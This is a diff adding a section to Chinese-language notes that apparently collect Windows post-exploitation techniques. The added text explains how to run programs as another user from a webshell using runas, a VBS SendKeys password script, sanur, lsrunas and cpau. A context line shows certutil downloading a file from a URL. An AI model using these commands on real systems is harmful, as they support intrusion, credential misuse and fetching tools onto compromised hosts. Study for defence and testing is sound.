@@ -288,3 +288,51 @@ certutil 还可用于从互联网下载文件。
 ```
 certutil.exe -urlcache -split -f http://example.com/a.txt
 ```
+
+
+
+
+### 程序降权启动方法
+
+第一种：runas
+
+```
+runas /user:a calc.exe
+```
+
+接着输入密码：a用户的密码
+
+calc.exe的权限为用户a的权限
+
+缺点：正常在webshell下进行，一般都是半交互式为主，该程序需要交互式才可以进行
+
+解决办法：自带的vbs脚本
+
+```vbs
+set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.run "runas /user:domain\user command" 'Open command prompt
+WScript.Sleep 1000
+WshShell.SendKeys "password" 'send password
+WshShell.SendKeys "{ENTER}"
+WScript.Sleep 1000
+```
+
+解决办法：第三方工具sanur
+
+```
+runas /user:domain\user notepad.exe | sanur password
+```
+
+第二种：lsrunas
+
+```
+lsrunas /user:administrator /password:123456 /domain: /command:notepad.exe /runpath:c:
+```
+
+第三种：cpau
+
+```
+cpau -u administrator -p password -ex notepad
+```
+
+
